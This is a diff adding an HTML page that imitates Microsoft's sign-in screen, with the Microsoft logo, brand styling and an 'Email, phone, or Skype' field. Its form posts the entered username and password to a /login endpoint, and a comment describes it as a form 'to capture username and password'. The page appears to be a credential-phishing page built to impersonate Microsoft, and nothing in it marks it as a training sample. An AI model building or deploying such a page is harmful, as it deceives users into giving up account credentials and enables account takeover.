@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to Microsoft</title>
+    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg">
+    <style>
+                body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f3f2f1; /* Light grey background similar to Microsoft */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            background-color: #FFFFFF;
+            border-radius: 8px;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
+            padding: 40px 30px;
+            text-align: left;
+            width: 400px;
+            max-width: 90%;
+            color: #252525;
+        }
+
+        .logo {
+            width: 80px;
+            display: block;
+            margin: 0 auto 20px;
+        }
+
+        h1 {
+            font-size: 24px;
+            color: #252525;
+            margin-bottom: 20px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border-radius: 4px;
+            border: 1px solid #c8c6c4;
+            font-size: 16px;
+            box-sizing: border-box;
+            background-color: #f9f9f9;
+            color: #252525;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #0067b8;
+        }
+
+        .forgot-password {
+            display: block;
+            text-align: left;
+            color: #0067b8;
+            font-size: 14px;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+
+        .sign-in-btn {
+            background-color: #0067b8;
+            border: none;
+            color: #FFFFFF;
+            padding: 12px 0;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        .sign-in-btn:hover {
+            background-color: #004a8c;
+        }
+
+        .create-account {
+            margin-top: 20px;
+            color: #0067b8;
+            font-size: 14px;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        .create-account:hover {
+            text-decoration: underline;
+        }
+
+        .container-footer {
+            text-align: left;
+            margin-top: 15px;
+            font-size: 12px;
+            color: #5e5e5e;
+        }
+
+        /* Mobile adjustments */
+        @media screen and (max-width: 768px) {
+            .login-container {
+                width: 95%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="logo">
+        <h1>Sign in</h1>
+
+        <!-- Form to capture username and password -->
+        <form action="/login" method="POST">
+            <input type="text" class="input-field" name="username" placeholder="Email, phone, or Skype" required>
+            <div class="forgot-password">Forgot username?</div>
+
+            <input type="password" class="input-field" name="password" placeholder="Password" required>
+
+            <button class="sign-in-btn" type="submit">Sign in</button>
+        </form>
+
+        <div class="create-account">No account? <a href="#">Create one!</a></div>
+        <div class="container-footer">
+            <p>By signing in, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p>
+        </div>
+    </div>
+</body>
+</html>
